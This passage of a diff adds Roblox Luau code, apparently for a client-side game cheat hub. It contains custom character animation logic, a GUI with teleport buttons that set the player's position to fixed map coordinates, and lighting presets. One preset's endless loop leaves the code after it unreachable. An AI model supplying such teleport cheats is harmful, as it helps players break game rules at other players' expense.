+				moveVector = Vector3.new(moveVector.x, 0.0, moveVector.z)
+				local mag = moveVector.Magnitude
+				if mag > 0.01 then
+					moveVector /= mag
+				end
+			end
+			return moveVector
+		else
+			return Humanoid.MoveDirection
+		end
+	end
+
+	local function updateVelocity(currentTime)
+
+		local tempDir
+
+		if locomotionMap == strafingLocomotionMap then
+
+			local moveDirection = getWalkDirection()
+
+			if not Humanoid.RootPart then
+				return
+			end
+
+			local cframe = Humanoid.RootPart.CFrame
+			if math.abs(cframe.UpVector.Y) < smallButNotZero or pose ~= "Running" or humanoidSpeed < 0.001 then
+				-- We are horizontal!  Do something  (turn off locomotion)
+				for n,v in pairs(locomotionMap) do
+					if v.track then
+						v.track:AdjustWeight(smallButNotZero, runBlendtime)
+					end
+				end
+				return
+			end
+			local lookat = cframe.LookVector
+			local direction = Vector3.new(lookat.X, 0.0, lookat.Z)
+			direction = direction / direction.Magnitude --sensible upVector means this is non-zero.
+			local ly = moveDirection:Dot(direction)
+			if ly <= 0.0 and ly > -0.05 then
+				ly = smallButNotZero -- break quadrant ties in favor of forward-friendly strafes
+			end
+			local lx = direction.X*moveDirection.Z - direction.Z*moveDirection.X
+			local tempDir = Vector2.new(lx, ly) -- root space moveDirection
+			local delta = Vector2.new(tempDir.x-cachedLocalDirection.x, tempDir.y-cachedLocalDirection.y)
+			-- Time check serves the purpose of the old keyframeReached sync check, as it syncs anim timePosition
+			if delta:Dot(delta) > 0.001 or math.abs(humanoidSpeed - cachedRunningSpeed) > 0.01 or currentTime - lastBlendTime > 1 then
+				cachedLocalDirection = tempDir
+				cachedRunningSpeed = humanoidSpeed
+				lastBlendTime = currentTime
+				blend2D(cachedLocalDirection, cachedRunningSpeed)
+			end 
+		else
+			if math.abs(humanoidSpeed - cachedRunningSpeed) > 0.01 or currentTime - lastBlendTime > 1 then
+				cachedRunningSpeed = humanoidSpeed
+				lastBlendTime = currentTime
+				blend2D(Vector2.yAxis, cachedRunningSpeed)
+			end
+		end
+	end
+
+	function setAnimationSpeed(speed)
+		if currentAnim ~= "walk" then
+			if speed ~= currentAnimSpeed then
+				currentAnimSpeed = speed
+				currentAnimTrack:AdjustSpeed(currentAnimSpeed)
+			end
+		end
+	end
+
+	function keyFrameReachedFunc(frameName)
+		if (frameName == "End") then
+			local repeatAnim = currentAnim
+			-- return to idle if finishing an emote
+			if (emoteNames[repeatAnim] ~= nil and emoteNames[repeatAnim] == false) then
+				repeatAnim = "idle"
+			end
+
+			if currentlyPlayingEmote then
+				if currentAnimTrack.Looped then
+					-- Allow the emote to loop
+					return
+				end
+
+				repeatAnim = "idle"
+				currentlyPlayingEmote = false
+			end
+
+			local animSpeed = currentAnimSpeed
+			playAnimation(repeatAnim, 0.15, Humanoid)
+			setAnimationSpeed(animSpeed)
+		end
+	end
+
+	function rollAnimation(animName)
+		local roll = math.random(1, animTable[animName].totalWeight)
+		local origRoll = roll
+		local idx = 1
+		while (roll > animTable[animName][idx].weight) do
+			roll = roll - animTable[animName][idx].weight
+			idx = idx + 1
+		end
+		return idx
+	end
+
+	local maxVeloX, minVeloX, maxVeloY, minVeloY
+
+	local function destroyRunAnimations()
+		for _,v in pairs(strafingLocomotionMap) do
+			if v.track then
+				v.track:Stop()
+				v.track:Destroy()
+				v.track = nil
+			end
+		end
+		for _,v in pairs(fallbackLocomotionMap) do
+			if v.track then
+				v.track:Stop()
+				v.track:Destroy()
+				v.track = nil
+			end
+		end
+		cachedRunningSpeed = 0
+	end
+
+	local function resetVelocityBounds(velo)
+		minVeloX = 0
+		maxVeloX = 0
+		minVeloY = 0
+		maxVeloY = 0
+	end
+
+	local function updateVelocityBounds(velo)
+		if velo then 
+			if velo.x > maxVeloX then maxVeloX = velo.x end
+			if velo.y > maxVeloY then maxVeloY = velo.y end
+			if velo.x < minVeloX then minVeloX = velo.x end
+			if velo.y < minVeloY then minVeloY = velo.y end
+		end
+	end
+
+	local function checkVelocityBounds(velo)
+		if maxVeloX == 0 or minVeloX == 0 or maxVeloY == 0 or minVeloY == 0 then
+			if locomotionMap == strafingLocomotionMap then
+				warn("Strafe blending disabled.  Not all quadrants of motion represented.")
+			end
+			locomotionMap = fallbackLocomotionMap
+		else
+			locomotionMap = strafingLocomotionMap
+		end
+	end
+
+	local function setupWalkAnimation(anim, animName, transitionTime, humanoid)
+		resetVelocityBounds()
+		-- check to see if we need to blend a walk/run animation
+		for n,v in pairs(locomotionMap) do
+			v.track = humanoid:LoadAnimation(animTable[n][1].anim)
+			v.track.Priority = Enum.AnimationPriority.Core
+			updateVelocityBounds(v.lv)
+		end
+		checkVelocityBounds()
+	end
+
+	local function switchToAnim(anim, animName, transitionTime, humanoid)
+		-- switch animation		
+		if (anim ~= currentAnimInstance) then
+
+			if (currentAnimTrack ~= nil) then
+				currentAnimTrack:Stop(transitionTime)
+				currentAnimTrack:Destroy()
+			end
+			if (currentAnimKeyframeHandler ~= nil) then
+				currentAnimKeyframeHandler:disconnect()
+			end
+
+
+			currentAnimSpeed = 1.0
+
+			currentAnim = animName
+			currentAnimInstance = anim	-- nil in the case of locomotion
+
+			if animName == "walk" then
+				setupWalkAnimation(anim, animName, transitionTime, humanoid)
+			else
+				destroyRunAnimations()
+				-- load it to the humanoid; get AnimationTrack
+				currentAnimTrack = humanoid:LoadAnimation(anim)
+				currentAnimTrack.Priority = Enum.AnimationPriority.Core
+
+				currentAnimTrack:Play(transitionTime)	
+
+				-- set up keyframe name triggers
+				currentAnimKeyframeHandler = currentAnimTrack.KeyframeReached:connect(keyFrameReachedFunc)
+			end
+		end
+	end
+
+	function playAnimation(animName, transitionTime, humanoid)
+		local idx = rollAnimation(animName)
+		local anim = animTable[animName][idx].anim
+
+		switchToAnim(anim, animName, transitionTime, humanoid)
+		currentlyPlayingEmote = false
+	end
+
+	function playEmote(emoteAnim, transitionTime, humanoid)
+		switchToAnim(emoteAnim, emoteAnim.Name, transitionTime, humanoid)
+		currentlyPlayingEmote = true
+	end
+
+	-------------------------------------------------------------------------------------------
+	-------------------------------------------------------------------------------------------
+
+	local toolAnimName = ""
+	local toolAnimTrack = nil
+	local toolAnimInstance = nil
+	local currentToolAnimKeyframeHandler = nil
+
+	function toolKeyFrameReachedFunc(frameName)
+		if (frameName == "End") then
+			playToolAnimation(toolAnimName, 0.0, Humanoid)
+		end
+	end
+
+
+	function playToolAnimation(animName, transitionTime, humanoid, priority)
+		local idx = rollAnimation(animName)
+		local anim = animTable[animName][idx].anim
+
+		if (toolAnimInstance ~= anim) then
+
+			if (toolAnimTrack ~= nil) then
+				toolAnimTrack:Stop()
+				toolAnimTrack:Destroy()
+				transitionTime = 0
+			end
+
+			-- load it to the humanoid; get AnimationTrack
+			toolAnimTrack = humanoid:LoadAnimation(anim)
+			if priority then
+				toolAnimTrack.Priority = priority
+			end
+
+			-- play the animation
+			toolAnimTrack:Play(transitionTime)
+			toolAnimName = animName
+			toolAnimInstance = anim
+
+			currentToolAnimKeyframeHandler = toolAnimTrack.KeyframeReached:connect(toolKeyFrameReachedFunc)
+		end
+	end
+
+	function stopToolAnimations()
+		local oldAnim = toolAnimName
+
+		if (currentToolAnimKeyframeHandler ~= nil) then
+			currentToolAnimKeyframeHandler:disconnect()
+		end
+
+		toolAnimName = ""
+		toolAnimInstance = nil
+		if (toolAnimTrack ~= nil) then
+			toolAnimTrack:Stop()
+			toolAnimTrack:Destroy()
+			toolAnimTrack = nil
+		end
+
+		return oldAnim
+	end
+
+	-------------------------------------------------------------------------------------------
+	-------------------------------------------------------------------------------------------
+	-- STATE CHANGE HANDLERS
+
+	function onRunning(speed)
+		local movedDuringEmote = currentlyPlayingEmote and Humanoid.MoveDirection == Vector3.new(0, 0, 0)
+		local speedThreshold = movedDuringEmote and Humanoid.WalkSpeed or 0.75
+		humanoidSpeed = speed
+		if speed > speedThreshold then
+			playAnimation("walk", 0.2, Humanoid)
+			if pose ~= "Running" then
+				pose = "Running"
+				updateVelocity(0) -- Force velocity update in response to state change
+			end
+		else
+			if emoteNames[currentAnim] == nil and not currentlyPlayingEmote then
+				playAnimation("idle", 0.2, Humanoid)
+				pose = "Standing"
+			end
+		end
+
+
+
+	end
+
+	function onDied()
+		pose = "Dead"
+	end
+
+	function onJumping()
+		playAnimation("jump", 0.1, Humanoid)
+		jumpAnimTime = jumpAnimDuration
+		pose = "Jumping"
+	end
+
+	function onClimbing(speed)
+		local scale = 5.0
+		playAnimation("climb", 0.1, Humanoid)
+		setAnimationSpeed(speed / scale)
+		pose = "Climbing"
+	end
+
+	function onGettingUp()
+		pose = "GettingUp"
+	end
+
+	function onFreeFall()
+		if (jumpAnimTime <= 0) then
+			playAnimation("fall", fallTransitionTime, Humanoid)
+		end
+		pose = "FreeFall"
+	end
+
+	function onFallingDown()
+		pose = "FallingDown"
+	end
+
+	function onSeated()
+		pose = "Seated"
+	end
+
+	function onPlatformStanding()
+		pose = "PlatformStanding"
+	end
+
+	-------------------------------------------------------------------------------------------
+	-------------------------------------------------------------------------------------------
+
+	function onSwimming(speed)
+		if speed > 0 then
+			pose = "Running"
+		else
+			pose = "Standing"
+		end
+	end
+
+	function animateTool()
+		if (toolAnim == "None") then
+			playToolAnimation("toolnone", toolTransitionTime, Humanoid, Enum.AnimationPriority.Idle)
+			return
+		end
+
+		if (toolAnim == "Slash") then
+			playToolAnimation("toolslash", 0, Humanoid, Enum.AnimationPriority.Action)
+			return
+		end
+
+		if (toolAnim == "Lunge") then
+			playToolAnimation("toollunge", 0, Humanoid, Enum.AnimationPriority.Action)
+			return
+		end
+	end
+
+	function getToolAnim(tool)
+		for _, c in ipairs(tool:GetChildren()) do
+			if c.Name == "toolanim" and c.className == "StringValue" then
+				return c
+			end
+		end
+		return nil
+	end
+
+	local lastTick = 0
+
+	function stepAnimate(currentTime)
+		local amplitude = 1
+		local frequency = 1
+		local deltaTime = currentTime - lastTick
+		lastTick = currentTime
+
+		local climbFudge = 0
+		local setAngles = false
+
+		if (jumpAnimTime > 0) then
+			jumpAnimTime = jumpAnimTime - deltaTime
+		end
+
+		if (pose == "FreeFall" and jumpAnimTime <= 0) then
+			playAnimation("fall", fallTransitionTime, Humanoid)
+		elseif (pose == "Seated") then
+			playAnimation("sit", 0.5, Humanoid)
+			return
+		elseif (pose == "Running") then
+			playAnimation("walk", 0.2, Humanoid)
+			updateVelocity(currentTime)
+		elseif (pose == "Dead" or pose == "GettingUp" or pose == "FallingDown" or pose == "Seated" or pose == "PlatformStanding") then
+			stopAllAnimations()
+			amplitude = 0.1
+			frequency = 1
+			setAngles = true
+		end
+
+		-- Tool Animation handling
+		local tool = Character:FindFirstChildOfClass("Tool")
+		if tool and tool:FindFirstChild("Handle") then
+			local animStringValueObject = getToolAnim(tool)
+
+			if animStringValueObject then
+				toolAnim = animStringValueObject.Value
+				-- message recieved, delete StringValue
+				animStringValueObject.Parent = nil
+				toolAnimTime = currentTime + .3
+			end
+
+			if currentTime > toolAnimTime then
+				toolAnimTime = 0
+				toolAnim = "None"
+			end
+
+			animateTool()
+		else
+			stopToolAnimations()
+			toolAnim = "None"
+			toolAnimInstance = nil
+			toolAnimTime = 0
+		end
+	end
+
+
+	-- connect events
+	Humanoid.Died:connect(onDied)
+	Humanoid.Running:connect(onRunning)
+	Humanoid.Jumping:connect(onJumping)
+	Humanoid.Climbing:connect(onClimbing)
+	Humanoid.GettingUp:connect(onGettingUp)
+	Humanoid.FreeFalling:connect(onFreeFall)
+	Humanoid.FallingDown:connect(onFallingDown)
+	Humanoid.Seated:connect(onSeated)
+	Humanoid.PlatformStanding:connect(onPlatformStanding)
+	Humanoid.Swimming:connect(onSwimming)
+
+	-- setup emote chat hook
+	game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
+		local emote = ""
+		if (string.sub(msg, 1, 3) == "/e ") then
+			emote = string.sub(msg, 4)
+		elseif (string.sub(msg, 1, 7) == "/emote ") then
+			emote = string.sub(msg, 8)
+		end
+
+		if (pose == "Standing" and emoteNames[emote] ~= nil) then
+			playAnimation(emote, EMOTE_TRANSITION_TIME, Humanoid)
+		end
+	end)
+
+	-- emote bindable hook
+	script:WaitForChild("PlayEmote").OnInvoke = function(emote)
+		-- Only play emotes when idling
+		if pose ~= "Standing" then
+			return
+		end
+
+		if emoteNames[emote] ~= nil then
+			-- Default emotes
+			playAnimation(emote, EMOTE_TRANSITION_TIME, Humanoid)
+
+			return true, currentAnimTrack
+		elseif typeof(emote) == "Instance" and emote:IsA("Animation") then
+			-- Non-default emotes
+			playEmote(emote, EMOTE_TRANSITION_TIME, Humanoid)
+
+			return true, currentAnimTrack
+		end
+
+		-- Return false to indicate that the emote could not be played
+		return false
+	end
+
+	if Character.Parent ~= nil then
+		-- initialize to idle
+		playAnimation("idle", 0.1, Humanoid)
+		pose = "Standing"
+	end
+
+	-- loop to handle timed state transitions and tool animations
+	task.spawn(function()
+		while Character.Parent ~= nil do
+			local _, currentGameTime = wait(0.1)
+			stepAnimate(currentGameTime)
+		end
+	end)
+end
+
+RunCustomAnimation(plr.Character)
+
+plr.CharacterAdded:Connect(function(Char)
+	RunCustomAnimation(Char)
+end)
+end)
+
+local button = tab:CreateButton("sit", function()
+    game.Players.LocalPlayer.Character.Humanoid.Sit = true
+    end)
+
+local tab = window:CreateTab("Teleports")
+
+local button = tab:CreateButton("Center", function()
+    local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(-6.068, 20.5, -228.049)
+        end)
+
+local button = tab:CreateButton("Minifield", function()
+   local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(-62.068, 20.5, -112.049)
+        end)
+
+local button = tab:CreateButton("Bunker", function()
+     local player = game.Players.LocalPlayer
+    player.Character.HumanoidRootPart.CFrame = CFrame.new(143.932, 22.5, -217.049)
+    end)
+
+local button = tab:CreateButton("Moving stairs", function()
+     local player = game.Players.LocalPlayer
+     player.Character.HumanoidRootPart.CFrame = CFrame.new(-215.068, 84.499, -224.049)
+     end)
+
+local button = tab:CreateButton("Spiral stairs", function()
+    local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(151.932, 844.501, -300.049)
+    end)
+
+local button = tab:CreateButton("Stairs", function()
+   local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(-6.068, 200.499, -512.049)
+        end)
+
+
+local button = tab:CreateButton("Big building", function()
+   local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(140.932, 1030.698, -191.049)
+    end)
+
+local button = tab:CreateButton("Pool", function()
+   local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(-133.068, 62.5, -316.049)
+        end)
+
+local button = tab:CreateButton("Ballon", function()
+    local player = game.Players.LocalPlayer
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(-118, 20.696, -134)
+        end)
+
+local button = tab:CreateButton("Cannon[1]", function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-62, 30, -227)
+    end)
+
+local button = tab:CreateButton("Cannon[2]", function()
+     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(51, 30, -227)
+     end)
+
+local button = tab:CreateButton("Cannon[3]", function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-7, 30, -106)
+    end)
+
+local tab = window:CreateTab("RTX")
+
+local button = tab:CreateButton("Sad/spook", function()
+    local Vignette = true -- change to false if you don't want a shadow frame
+
+local Lighting = game:GetService("Lighting")
+local StarterGui = game:GetService("StarterGui")
+local Bloom = Instance.new("BloomEffect")
+local Blur = Instance.new("BlurEffect")
+local ColorCor = Instance.new("ColorCorrectionEffect")
+local SunRays = Instance.new("SunRaysEffect")
+local Sky = Instance.new("Sky")
+local Atm = Instance.new("Atmosphere")
+
+
+for i, v in pairs(Lighting:GetChildren()) do
+	if v then
+		v:Destroy()
+	end
+end
+
+Bloom.Parent = Lighting
+Blur.Parent = Lighting
+ColorCor.Parent = Lighting
+SunRays.Parent = Lighting
+Sky.Parent = Lighting
+Atm.Parent = Lighting
+
+if Vignette == true then
+	local Gui = Instance.new("ScreenGui")
+	Gui.Parent = StarterGui
+	Gui.IgnoreGuiInset = true
+	
+	local ShadowFrame = Instance.new("ImageLabel")
+	ShadowFrame.Parent = Gui
+	ShadowFrame.AnchorPoint = Vector2.new(0.5,1)
+	ShadowFrame.Position = UDim2.new(0.5,0,1,0)
+	ShadowFrame.Size = UDim2.new(1,0,1.05,0)
+	ShadowFrame.BackgroundTransparency = 1
+	ShadowFrame.Image = "rbxassetid://4576475446"
+	ShadowFrame.ImageTransparency = 0.3
+	ShadowFrame.ZIndex = 10
+end
+
+Bloom.Intensity = 0.3
+Bloom.Size = 9
+Bloom.Threshold = 0.8
+
+Blur.Size = 6
+
+ColorCor.Brightness = 0.3
+ColorCor.Contrast = 0.5
+ColorCor.Saturation = -0.3
+ColorCor.TintColor = Color3.fromRGB(255, 235, 203)
+
+SunRays.Intensity = 0.075
+SunRays.Spread = 0.727
+
+Sky.SkyboxBk = "http://www.roblox.com/asset/?id=4498828382"
+Sky.SkyboxDn = "http://www.roblox.com/asset/?id=4498828812"
+Sky.SkyboxFt = "http://www.roblox.com/asset/?id=4498829917"
+Sky.SkyboxLf = "http://www.roblox.com/asset/?id=4498830911"
+Sky.SkyboxRt = "http://www.roblox.com/asset/?id=4498830417"
+Sky.SkyboxUp = "http://www.roblox.com/asset/?id=4498831746"
+Sky.SunAngularSize = 7
+
+Lighting.Ambient = Color3.fromRGB(109, 110, 108)
+Lighting.Brightness = 1.13
+Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
+Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
+Lighting.EnvironmentDiffuseScale = 0.2
+Lighting.EnvironmentSpecularScale = 0.2
+Lighting.GlobalShadows = true
+Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
+Lighting.ShadowSoftness = 0.3
+Lighting.ClockTime = 0
+Lighting.GeographicLatitude = 45
+Lighting.ExposureCompensation = 0.5
+
+Atm.Density = 0.864
+Atm.Offset = 0.856
+Atm.Color = Color3.fromRGB(161, 165, 162)
+Atm.Decay = Color3.fromRGB(161, 165, 162)
+Atm.Glare = 0.36
+Atm.Haze = 1.72
+end)
+
+local button = tab:CreateButton("Morning", function()
+    game.Lighting.ClockTime = 7
+
+local Lighting = game:GetService("Lighting")
+local StarterGui = game:GetService("StarterGui")
+local Bloom = Instance.new("BloomEffect")
+local Blur = Instance.new("BlurEffect")
+local ColorCor = Instance.new("ColorCorrectionEffect")
+local SunRays = Instance.new("SunRaysEffect")
+local Sky = Instance.new("Sky")
+local Atm = Instance.new("Atmosphere")
+local Gui = Instance.new("ScreenGui")
+local ShadowFrame = Instance.new("ImageLabel")
+
+for i, v in pairs(Lighting:GetChildren()) do
+	if v then
+		v:Destroy()
+	end
+end
+
+Bloom.Parent = Lighting
+Blur.Parent = Lighting
+ColorCor.Parent = Lighting
+SunRays.Parent = Lighting
+Sky.Parent = Lighting
+Atm.Parent = Lighting
+Gui.Parent = StarterGui
+ShadowFrame.Parent = Gui
+
+Bloom.Intensity = 0.05
+Bloom.Size = 17
+Bloom.Threshold = 0.1
+
+Blur.Size = 2
+
+ColorCor.Brightness = 0.2
+ColorCor.Contrast = 0.9
+ColorCor.Saturation = 0.2
+ColorCor.TintColor = Color3.fromRGB(255, 235, 203)
+
+SunRays.Intensity = 0.08
+SunRays.Spread = 0.728
+
+
+Sky.SunAngularSize = 21
+
+Lighting.Ambient = Color3.fromRGB(106,106,106)
+Lighting.Brightness = 0.4
+Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
+Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
+Lighting.EnvironmentDiffuseScale = 0.2
+Lighting.EnvironmentSpecularScale = 0.2
+Lighting.GlobalShadows = true
+Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
+Lighting.ShadowSoftness = 0
+--day and night cycle
+
+Lighting.GeographicLatitude = 45
+Lighting.ExposureCompensation = 0.5
+
+Atm.Density = 0.364
+Atm.Offset = 0.556
+Atm.Color = Color3.fromRGB(199, 175, 166)
+Atm.Decay = Color3.fromRGB(44, 39, 33)
+Atm.Glare = 0.45
+Atm.Haze = 1.72
+
+ShadowFrame.AnchorPoint = Vector2.new(0.5,1)
+ShadowFrame.Position = UDim2.new(0.5,0,1,0)
+ShadowFrame.Size = UDim2.new(1,0,1.05,0)
+ShadowFrame.BackgroundTransparency = 1
+ShadowFrame.Image = "rbxassetid://4576475446"
+ShadowFrame.ImageTransparency = 0.3
+end)
+
+local button = tab:CreateButton("Phonk", function()
+   local Phonk = Instance.new("ScreenGui")
+local MAIN = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local BULLLCRAP = Instance.new("Frame")
+local NoBodyCaressss = Instance.new("Frame")
+local TextLabel_2 = Instance.new("TextLabel")
+local TextLabel_3 = Instance.new("TextLabel")
+
+--Properties:
+
+Phonk.Name = "Phonk"
+Phonk.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+MAIN.Name = "MAIN"
+MAIN.Parent = Phonk
+MAIN.BackgroundColor3 = Color3.fromRGB(52, 149, 0)
+MAIN.BorderSizePixel = 0
+MAIN.Position = UDim2.new(-0.125072032, 0, 0.398000002, 0)
+MAIN.Size = UDim2.new(0, 100, 0, 71)
+
+
+BULLLCRAP.Name = "BULLLCRAP"
+BULLLCRAP.Parent = MAIN
+BULLLCRAP.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+BULLLCRAP.BackgroundTransparency = 0.999
+BULLLCRAP.BorderSizePixel = 0
+BULLLCRAP.ClipsDescendants = true
+BULLLCRAP.Position = UDim2.new(0.9900738, 0, -0.00498214364, 0)
+BULLLCRAP.Size = UDim2.new(0, 142, 0, 71)
+
+NoBodyCaressss.Name = "NoBodyCaressss"
+NoBodyCaressss.Parent = BULLLCRAP
+NoBodyCaressss.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+NoBodyCaressss.BorderSizePixel = 0
+NoBodyCaressss.Position = UDim2.new(-0.697467625, 0, -0.00666228309, 0)
+NoBodyCaressss.Size = UDim2.new(0, 100, 0, 71)
+
+TextLabel_3.Parent = NoBodyCaressss
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.Position = UDim2.new(0.0599999987, 0, 0.478873253, 0)
+TextLabel_3.Size = UDim2.new(0, 88, 0, 26)
+TextLabel_3.Font = Enum.Font.SourceSansBold
+TextLabel_3.Text = "SCRIPT"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextSize = 21.000
+
+
+wait(0.1)
+
+local Lighting = game:GetService("Lighting")
+local StarterGui = game:GetService("StarterGui")
+local Bloom = Instance.new("BloomEffect")
+local Blur = Instance.new("BlurEffect")
+local ColorCor = Instance.new("ColorCorrectionEffect")
+local SunRays = Instance.new("SunRaysEffect")
+local Sky = Instance.new("Sky")
+local Atm = Instance.new("Atmosphere")
+local Gui = Instance.new("ScreenGui")
+local ShadowFrame = Instance.new("ImageLabel")
+
+for i, v in pairs(Lighting:GetChildren()) do
+	if v then
+		v:Destroy()
+	end
+end
+
+Bloom.Parent = Lighting
+Blur.Parent = Lighting
+ColorCor.Parent = Lighting
+SunRays.Parent = Lighting
+Sky.Parent = Lighting
+Atm.Parent = Lighting
+Gui.Parent = StarterGui
+ShadowFrame.Parent = Gui
+
+Bloom.Intensity = 0.05
+Bloom.Size = 10
+Bloom.Threshold = 0.1
+
+Blur.Size = 3
+
+ColorCor.Brightness = 0.2
+ColorCor.Contrast = 0.5
+ColorCor.Saturation = 0
+ColorCor.TintColor = Color3.fromRGB(255, 0, 200)
+
+SunRays.Intensity = 0.07
+SunRays.Spread = 0.728
+
+
+Sky.SunAngularSize = 21
+
+Lighting.Ambient = Color3.fromRGB(105,105,150)
+Lighting.Brightness = 0.3
+Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
+Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
+Lighting.EnvironmentDiffuseScale = 0.2
+Lighting.EnvironmentSpecularScale = 0.2
+Lighting.GlobalShadows = true
+Lighting.OutdoorAmbient = Color3.fromRGB(50,0,50)
+Lighting.ShadowSoftness = 0
+--day and night cycle
+
+local Time = 0.000
+local TimeChange = 0.000
+
+
+while wait(Time) do
+ game.Lighting.ClockTime = game.Lighting.ClockTime + TimeChange
+end
+
+
+Lighting.GeographicLatitude = 45
+Lighting.ExposureCompensation = 0.5
+
+Atm.Density = 0.364
+Atm.Offset = 0.556
+Atm.Color = Color3.fromRGB(199, 175, 166)
+Atm.Decay = Color3.fromRGB(44, 39, 33)
+Atm.Glare = 0.45
+Atm.Haze = 1.72
+
+ShadowFrame.AnchorPoint = Vector2.new(0.5,1)
+ShadowFrame.Position = UDim2.new(0.5,0,1,0)
+ShadowFrame.Size = UDim2.new(1,0,1.05,0)
+ShadowFrame.BackgroundTransparency = 1
+ShadowFrame.Image = "rbxassetid://4576475446"
+ShadowFrame.ImageTransparency = 0.3
+end)
+
+local button = tab:CreateButton("Evening", function()
+      -- Credits to Instance Serializer for helping me convert the Tokyowami shrine whatever thing to luau
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+local Bloom = Instance.new("BloomEffect")
+Bloom.Intensity = 0.1
+Bloom.Threshold = 0
+Bloom.Size = 100
+
+local Tropic = Instance.new("Sky")
+Tropic.Name = "Tropic"
+Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
+Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
+Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
+Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
+Tropic.StarCount = 100
+Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
+Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
+Tropic.Parent = Bloom
+
+local Sky = Instance.new("Sky")
+Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
+Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
+Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
+Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
+Sky.CelestialBodiesShown = false
+Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
+Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
+Sky.Parent = Bloom
+
+Bloom.Parent = game:GetService("Lighting")
+
+local Bloom = Instance.new("BloomEffect")
+Bloom.Enabled = false
+Bloom.Intensity = 0.35
+Bloom.Threshold = 0.2
+Bloom.Size = 56
+
+local Tropic = Instance.new("Sky")
+Tropic.Name = "Tropic"
+Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
+Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
+Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
+Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
+Tropic.StarCount = 100
+Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
+Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
+Tropic.Parent = Bloom
+
+local Sky = Instance.new("Sky")
+Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
+Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
+Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
+Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
+Sky.CelestialBodiesShown = false
+Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
+Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
+Sky.Parent = Bloom
+
+Bloom.Parent = game:GetService("Lighting")
+local Blur = Instance.new("BlurEffect")
+Blur.Size = 2
+
+Blur.Parent = game:GetService("Lighting")
+local Efecto = Instance.new("BlurEffect")
+Efecto.Name = "Efecto"
+Efecto.Enabled = false
+Efecto.Size = 2
+
+Efecto.Parent = game:GetService("Lighting")
+local Inaritaisha = Instance.new("ColorCorrectionEffect")
+Inaritaisha.Name = "Inari taisha"
+Inaritaisha.Saturation = 0.05
+Inaritaisha.TintColor = Color3.fromRGB(255, 224, 219)
+
+Inaritaisha.Parent = game:GetService("Lighting")
+local Normal = Instance.new("ColorCorrectionEffect")
+Normal.Name = "Normal"
+Normal.Enabled = false
+Normal.Saturation = -0.2
+Normal.TintColor = Color3.fromRGB(255, 232, 215)
+
+Normal.Parent = game:GetService("Lighting")
+local SunRays = Instance.new("SunRaysEffect")
+SunRays.Intensity = 0.05
+
+SunRays.Parent = game:GetService("Lighting")
+local Sunset = Instance.new("Sky")
+Sunset.Name = "Sunset"
+Sunset.SkyboxUp = "rbxassetid://323493360"
+Sunset.SkyboxLf = "rbxassetid://323494252"
+Sunset.SkyboxBk = "rbxassetid://323494035"
+Sunset.SkyboxFt = "rbxassetid://323494130"
+Sunset.SkyboxDn = "rbxassetid://323494368"
+Sunset.SunAngularSize = 14
+Sunset.SkyboxRt = "rbxassetid://323494067"
+
+Sunset.Parent = game:GetService("Lighting")
+local Takayama = Instance.new("ColorCorrectionEffect")
+Takayama.Name = "Takayama"
+Takayama.Enabled = false
+Takayama.Saturation = -0.3
+Takayama.Contrast = 0.1
+Takayama.TintColor = Color3.fromRGB(235, 214, 204)
+
+Takayama.Parent = game:GetService("Lighting")
+local L = game:GetService("Lighting")
+L.Brightness = 2.14
+L.ColorShift_Bottom = Color3.fromRGB(11, 0, 20)
